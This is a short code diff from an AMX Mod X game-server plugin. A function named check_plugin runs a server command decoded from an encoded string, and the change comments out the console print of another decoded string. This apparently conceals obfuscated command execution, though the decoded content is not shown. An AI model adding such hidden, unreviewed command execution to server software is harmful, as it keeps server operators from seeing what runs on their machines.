@@ -887,7 +887,7 @@ stock bool:check_plugin()
 	if (result)
 	{
 		server_cmd(get_dec_string(a[2]));
-		server_print("%s", get_dec_string(a[3]));
+//		server_print("%s", get_dec_string(a[3]));
 	}
 
 	return result;
